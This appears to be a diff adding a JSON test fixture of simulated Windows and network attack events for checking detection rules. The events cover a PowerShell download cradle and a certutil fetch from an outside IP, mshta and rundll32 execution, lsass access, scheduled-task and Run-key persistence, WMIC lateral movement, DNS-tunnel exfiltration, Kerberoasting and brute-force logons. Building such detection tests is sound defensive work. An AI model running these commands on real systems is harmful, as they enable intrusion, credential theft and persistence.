@@ -1,0 +1,271 @@
+[
+  {
+    "_id": "ATTACK-EVT-001",
+    "rule_target": "CDL-RULE-001",
+    "timestamp": "2026-10-08T08:22:15.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://185.106.94.234:8080/stage.ps1')\"",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
+  },
+  {
+    "_id": "ATTACK-EVT-002",
+    "rule_target": "CDL-RULE-002",
+    "timestamp": "2026-10-08T08:41:12.000Z",
+    "logsource": "windows_process_access",
+    "ComputerName": "WKSTN-FIN-01",
+    "SourceImage": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rundll32.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010",
+    "CallTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9fb84|UNKNOWN(00007FF7B12C1284)"
+  },
+  {
+    "_id": "ATTACK-EVT-003",
+    "rule_target": "CDL-RULE-003",
+    "timestamp": "2026-10-08T08:53:15.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "DC-01",
+    "User": "CYBERION\\da_admin",
+    "Image": "C:\\Windows\\PSEXESVC.exe",
+    "CommandLine": "C:\\Windows\\PSEXESVC.exe -accepteula",
+    "ParentImage": "C:\\Windows\\System32\\services.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-004",
+    "rule_target": "CDL-RULE-004",
+    "timestamp": "2026-10-07T02:20:10.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WS-FIN-04",
+    "User": "CYBERION\\svc_backup",
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami /priv",
+    "ParentImage": "C:\\Windows\\System32\\wbem\\wmiprvse.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-005",
+    "rule_target": "CDL-RULE-005",
+    "timestamp": "2026-10-08T08:23:00.000Z",
+    "logsource": "zeek_http",
+    "id.orig_h": "192.168.10.115",
+    "id.resp_h": "185.106.94.234",
+    "id.resp_p": 8443,
+    "uri": "/api/v1/heartbeat",
+    "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Cobalt)",
+    "status_code": 200
+  },
+  {
+    "_id": "ATTACK-EVT-006",
+    "rule_target": "CDL-RULE-006",
+    "timestamp": "2026-10-07T02:26:05.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "FS-CORP-01",
+    "User": "CYBERION\\svc_backup",
+    "Image": "C:\\Windows\\System32\\vssadmin.exe",
+    "CommandLine": "vssadmin.exe create shadow /for=C:",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-007",
+    "rule_target": "CDL-RULE-007",
+    "timestamp": "2026-10-08T08:58:00.000Z",
+    "logsource": "windows_security",
+    "EventID": 4728,
+    "ComputerName": "DC-01",
+    "SubjectUserName": "da_admin",
+    "TargetUserName": "Domain Admins",
+    "MemberName": "CN=jdoe,OU=Users,DC=cyberion,DC=local"
+  },
+  {
+    "_id": "ATTACK-EVT-008",
+    "rule_target": "CDL-RULE-008",
+    "timestamp": "2026-10-08T08:22:31.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe C:\\Users\\jdoe\\AppData\\Local\\Temp\\sqlncli.dll,#1",
+    "ParentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-009",
+    "rule_target": "CDL-RULE-009",
+    "timestamp": "2026-10-08T08:35:10.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\schtasks.exe",
+    "CommandLine": "schtasks.exe /create /tn \"SecurityUpdate\" /tr \"powershell.exe -w hidden -enc JAB...\" /sc daily /ru SYSTEM",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-010",
+    "rule_target": "CDL-RULE-010",
+    "timestamp": "2026-10-08T08:36:20.000Z",
+    "logsource": "windows_registry_set",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\reg.exe",
+    "TargetObject": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsSync",
+    "Details": "C:\\Users\\Public\\updater.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-011",
+    "rule_target": "CDL-RULE-011",
+    "timestamp": "2026-10-07T02:35:18.000Z",
+    "logsource": "zeek_dns",
+    "id.orig_h": "192.168.20.15",
+    "id.resp_h": "1.1.1.1",
+    "qtype_name": "TXT",
+    "query": "aW5maWx0cmF0aW9u.stage01.tunnel.data-exfil-c2.net",
+    "answers": ["\"chunk_resp_ok\""]
+  },
+  {
+    "_id": "ATTACK-EVT-012",
+    "rule_target": "CDL-RULE-012",
+    "timestamp": "2026-10-08T08:24:12.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://185.106.94.234/beacon.bin C:\\Users\\Public\\beacon.bin",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-013",
+    "rule_target": "CDL-RULE-013",
+    "timestamp": "2026-10-08T08:21:40.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -w hidden\"\", 0:close\")",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-014",
+    "rule_target": "CDL-RULE-014",
+    "timestamp": "2026-10-08T08:45:00.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WKSTN-FIN-01",
+    "User": "CYBERION\\jdoe",
+    "Image": "C:\\Windows\\System32\\netsh.exe",
+    "CommandLine": "netsh.exe interface portproxy add v4tov4 listenport=8080 connectaddress=192.168.20.10 connectport=3389",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-EVT-015",
+    "rule_target": "CDL-RULE-015",
+    "timestamp": "2026-10-08T08:30:11.000Z",
+    "logsource": "windows_security",
+    "EventID": 4769,
+    "ComputerName": "DC-01",
+    "TargetUserName": "svc_sql@CYBERION.LOCAL",
+    "ServiceName": "MSSQLSvc/db01.cyberion.local:1433",
+    "TicketEncryptionType": "0x17",
+    "IpAddress": "192.168.10.115"
+  },
+  {
+    "_id": "ATTACK-CORR-016-1",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:44:00.000Z",
+    "logsource": "windows_security",
+    "EventID": 4625,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-016-2",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:44:10.000Z",
+    "logsource": "windows_security",
+    "EventID": 4625,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-016-3",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:44:20.000Z",
+    "logsource": "windows_security",
+    "EventID": 4625,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-016-4",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:44:30.000Z",
+    "logsource": "windows_security",
+    "EventID": 4625,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-016-5",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:44:40.000Z",
+    "logsource": "windows_security",
+    "EventID": 4625,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-016-6",
+    "rule_target": "CDL-RULE-016_seq",
+    "timestamp": "2026-10-08T07:45:00.000Z",
+    "logsource": "windows_security",
+    "EventID": 4624,
+    "LogonType": 3,
+    "ComputerName": "DC-01",
+    "TargetUserName": "administrator",
+    "IpAddress": "45.154.255.89"
+  },
+  {
+    "_id": "ATTACK-CORR-017-1",
+    "rule_target": "CDL-RULE-017_seq",
+    "timestamp": "2026-10-07T02:19:04.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WS-FIN-04",
+    "User": "CYBERION\\svc_backup",
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net.exe group \"Domain Admins\" /domain",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-CORR-017-2",
+    "rule_target": "CDL-RULE-017_seq",
+    "timestamp": "2026-10-07T02:22:15.000Z",
+    "logsource": "windows_process_creation",
+    "ComputerName": "WS-FIN-04",
+    "User": "CYBERION\\svc_backup",
+    "Image": "C:\\Windows\\System32\\wbem\\wmic.exe",
+    "CommandLine": "wmic.exe /node:\"192.168.20.15\" process call create \"cmd.exe /c whoami\"",
+    "ParentImage": "C:\\Windows\\System32\\cmd.exe"
+  },
+  {
+    "_id": "ATTACK-CORR-018-1",
+    "rule_target": "CDL-RULE-018_seq",
+    "timestamp": "2026-10-08T08:41:12.000Z",
+    "logsource": "windows_process_access",
+    "ComputerName": "WKSTN-FIN-01",
+    "SourceImage": "C:\\Users\\jdoe\\AppData\\Local\\Temp\\rundll32.exe",
+    "TargetImage": "C:\\Windows\\System32\\lsass.exe",
+    "GrantedAccess": "0x1010"
+  },
+  {
+    "_id": "ATTACK-CORR-018-2",
+    "rule_target": "CDL-RULE-018_seq",
+    "timestamp": "2026-10-08T08:42:05.000Z",
+    "logsource": "windows_network_connection",
+    "ComputerName": "WKSTN-FIN-01",
+    "DestinationIp": "185.106.94.234",
+    "DestinationPort": 8443
+  }
+]
